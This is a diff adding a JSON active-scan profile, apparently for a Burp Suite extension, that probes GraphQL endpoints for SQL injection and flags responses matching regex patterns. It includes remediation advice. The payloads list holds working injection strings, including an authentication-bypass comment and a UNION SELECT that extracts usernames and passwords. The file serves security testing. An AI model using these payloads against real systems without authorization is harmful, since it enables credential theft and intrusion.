@@ -1,0 +1,62 @@
+[
+  {
+    "profile_name": "GraphQL_SQL_Injection",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,{\"query\":\"{\\n  user(id: \\\"1' OR '1'='1\\\") {\\n    id\\n    name\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  user(id: \\\"1\\\" OR \\\"1\\\"=\\\"1\\\") {\\n    id\\n    name\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  user(username: \\\"admin' --\\\") {\\n    id\\n    name\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  users(filter: \\\"id = 1 OR 1=1\\\") {\\n    id\\n    name\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  products(where: \\\"category = 'Electronics' OR 1=1\\\") {\\n    id\\n    name\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  user(id: \\\"1' UNION SELECT username, password FROM users --\\\") {\\n    id\\n    name\\n  }\\n}\"}"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "user_provided",
+          "entire_body_json"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Simple String,,\"errors\":",
+          "true,OR,Regex,,\"data\":\\s*\\{[^}]+\"user\":\\s*(?:\\{[^}]+\"id\":[^,]+|null)",
+          "true,OR,Regex,,\"data\":\\s*\\{[^}]+\"users\":\\s*\\[",
+          "true,OR,Regex,,\"data\":\\s*\\{[^}]+\"products\":\\s*\\[",
+          "true,AND,Content Type,,application/json"
+        ],
+        "redir_type": "always",
+        "max_redir": 5,
+        "show_alert": "always",
+        "issue_name": "GraphQL SQL Injection",
+        "issue_severity": "High",
+        "issue_confidence": "Tentative",
+        "issue_detail": "The GraphQL endpoint may be vulnerable to SQL injection through query arguments. The response patterns suggest that user-supplied input might be directly incorporated into SQL queries without proper sanitization.",
+        "remediation_detail": "Ensure all user input is properly validated and sanitized before being used in database queries. Use parameterized queries or prepared statements for all database operations. Consider using an ORM that handles input sanitization automatically.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "GraphQL",
+      "Injection",
+      "SQLi",
+      "All"
+    ]
+  }
+]
